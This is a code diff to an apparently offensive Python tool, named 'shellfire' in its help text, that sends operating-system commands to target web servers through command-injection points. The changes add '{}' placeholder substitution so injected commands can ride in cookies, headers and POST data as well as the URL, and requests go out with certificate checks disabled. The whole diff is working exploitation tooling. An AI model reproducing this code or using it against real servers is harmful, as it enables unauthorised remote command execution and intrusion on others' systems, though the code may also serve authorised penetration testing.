@@ -134,19 +134,22 @@ def cmd_cookies(cmd):
   ## configure cookies to be sent to target
   ## right now, we only parse JSON
   if len(cmd) < 2:
-    sys.stdout.write("[*] cookies: %s\n" % (json.dumps(cfg.cookies)))
-  else:
-    try:
-      cmd.pop(0)
-      cfg.cookies = json.loads(" ".join(cmd))
-    except Exception as e:
-      sys.stderr.write("[!] %s\n" % e)
+    sys.stdout.write("[*] Cookies: %s\n" % (json.dumps(cfg.cookies)))
+    return
+  ## grab our original input, sans our initial command
+  json_data = state.userinput[len(cmd[0]):]
+  ## parse our json data
+  try:
+    cfg.cookies = json.loads(json_data)
+  except Exception as e:
+    sys.stderr.write("[!] %s\n" % e)
+  sys.stdout.write("[*] Cookies set: %s\n" % json.dumps(cfg.cookies))
   return
 
 def cmd_encode(cmd):
   ## if no params passed, display current encoding plugins
   if len(cmd) == 1:
-    sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
+    sys.stdout.write("[*] Encoding: %s\n" % (' | '.join(cfg.encode_chain)))
     return
   ## Set our encoding plugins!
   ## let's remove ".encode" from our cmd
@@ -203,31 +206,24 @@ def cmd_headers(cmd):
     return
   elif len(cmd) == 1:
     sys.stdout.write("[*] Request headers are: \n")
-    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
+    sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
     return
+  ## let's set our headers!
+  if cmd[1] == "default":
+    cfg.headers = cfg.default_headers
+    sys.stdout.write("[*] Set request headers back to default.\n")
+    return
+  ## grab our original input, sans our initial command
+  json_data = state.userinput[len(cmd[0]):]
+  ## custom header parsing next...
   try:
-    cmd.pop(0)
-    if "".join(cmd).strip() == "default":
-      ## Apply the default headers here
-      cfg.headers = cfg.default_headers
-      sys.stdout.write("[*] Set request headers back to default...\n")
-    else:
-      ## Convert deserialize the json
-      tmp_headers = json.loads(" ".join(cmd))
-      
-      ## Upsert into cfg.headers
-      for header in tmp_headers:
-        if header not in cfg.headers:
-          cfg.headers[header] = tmp_headers[header]
-        else:
-          if cfg.headers[header] != tmp_headers[header]:
-            cfg.headers[header] = tmp_headers[header]
-      
-      ## Sanity check
-      sys.stdout.write("[*] Request headers are now: \n")
-      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
+    cfg.headers = json.loads(json_data)
   except Exception as e:
     sys.stderr.write("[!] %s\n" % e)
+  ## Sanity check
+  sys.stdout.write("[*] Request headers are now: \n")
+  sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
+  return
 
 def cmd_help(cmd):
   if len(cmd) == 2:
@@ -344,17 +340,23 @@ def cmd_phpinfo(cmd):
   return
 
 def cmd_plugins(cmd):
+  ## show our available plugins
   sys.stdout.write("[*] Available plugins: %s\n" % (' '.join(plugins.plugins)))
   return
 
 def cmd_post(cmd):
   ## configure POST data to send
   if len(cmd) < 2:
-    cfg.post = {}
-  else:
-    cmd.pop(0)
-    cfg.post = json.loads(" ".join(cmd))
-  sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
+    sys.stdout.write("[*] POST data: %s\n" % json.dumps(cfg.post_data))
+    return
+  ## grab our original input, sans our initial command
+  json_data = state.userinput[len(cmd[0]):]
+  ## parse our json data
+  try:
+    cfg.post_data = json.loads(json_data)
+  except Exception as e:
+    sys.stderr.write("[!] %s\n" % e)
+  sys.stdout.write("[*] POST data set: %s\n" % json.dumps(cfg.post_data))
   return
 
 def cmd_referer(cmd):
@@ -413,25 +415,39 @@ def send_payload():
       except:
         pass
 
-    ## validate the URL format
+    ## generate GET payloads
     if '{}' in cfg.url:
       query = cfg.url.replace('{}', cmd.strip())
     else:
-      if '?' in cfg.url:
-        if 'cmd=' not in cfg.url:
-          query = cfg.url + '&cmd=' + cmd
-        else:
-          query = cfg.url.replace('cmd=', 'cmd=' + cmd)
-      else:
-        query = cfg.url + cmd.strip()
+      query = cfg.url
+
+    ## generate POST payloads
+    post_data = cfg.post_data.copy()
+    for k, v in post_data.items():
+      post_data[k] = v.replace('{}', cmd.strip())
+
+    ## generate cookie payloads
+    cookie_data = cfg.cookies.copy()
+    for k, v in cookie_data.items():
+      cookie_data[k] = v.replace('{}', cmd.strip())
+
+    ## generate headers payloads
+    header_data = cfg.headers.copy()
+    for k, v in header_data.items():
+      header_data[k] = v.replace('{}', cmd.strip())
+
     ## log debug info
     if state.args.debug:
-      sys.stdout.write("[D] " + query + "\n")
+      sys.stdout.write("[D] URL %s\n" % query)
+      if cfg.method == "post":
+        sys.stdout.write("[D] POST %s\n" % json.dumps(post_data))
+      sys.stdout.write("[D] Cookies %s\n" % json.dumps(cookie_data))
+      sys.stdout.write("[D] Headers %s\n" % json.dumps(header_data))
     try:
       if cfg.method == "post":
-        r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+        r = requests.post(query, data=post_data, verify=False, cookies=cookie_data, headers=header_data, auth=cfg.auth)
       else:
-        r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+        r = requests.get(query, verify=False, cookies=cookie_data, headers=header_data, auth=cfg.auth)
       ## sanitize the output. we only want to see our commands if possible
       output = ""
       if cfg.marker:
@@ -486,6 +502,7 @@ command_list = {
     "help_text": [
       ".cookies        - show current cookies to be sent with each request.\n",
       ".cookies <json> - a json string representing cookies you wish to send.\n",
+      "                  use '{}' to specify where command injection goes.\n",
     ],
   },
   "encode": {
@@ -517,7 +534,8 @@ command_list = {
     "description": "",
     "help_text": [
       ".headers default - sets the headers back to the shellfire defaults.\n",
-      ".headers {\"X-EXAMPLE\": \"some_value_here\"} - upserts the headers in the JSON object to the header config.\n",
+      ".headers <json>  - upserts the headers in the JSON object to the header config.\n",
+      "                   use '{}' to specify where command injection goes.\n",
     ],
   },
   "help": {
@@ -586,6 +604,7 @@ command_list = {
     "description": "",
     "help_text": [
       ".post <json> - a json string representing post data you wish to send.\n",
+      "               use '{}' to specify where command injection goes.\n",
     ]
   },
   "referer": {
@@ -607,8 +626,8 @@ command_list = {
     "func": cmd_url,
     "description": "",
     "help_text": [
-      ".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n",
-      "                if {} is not set, 'cmd' param will automatically be appended.\n",
+      ".url <string> - set the target URL to string.\n",
+      "                use '{}' to specify where command injection goes.\n",
     ],
   },
   "useragent": {
